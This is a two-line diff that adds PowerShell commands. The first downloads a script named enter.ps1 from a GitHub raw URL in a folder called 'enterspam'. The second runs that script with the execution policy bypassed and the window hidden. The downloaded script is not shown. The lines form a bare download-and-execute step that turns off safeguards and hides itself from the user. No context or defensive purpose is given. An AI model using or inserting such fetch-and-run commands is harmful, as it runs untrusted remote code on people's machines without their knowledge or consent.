@@ -1,0 +1,2 @@
+Powershell Invoke-WebRequest -Uri https://raw.githubusercontent.com/Babyporkchop/Scripts/main/enterspam/enter.ps1 -OutFile .\enter.ps1
+powershell -ExecutionPolicy Bypass -File enter.ps1 -windowstyle hidden
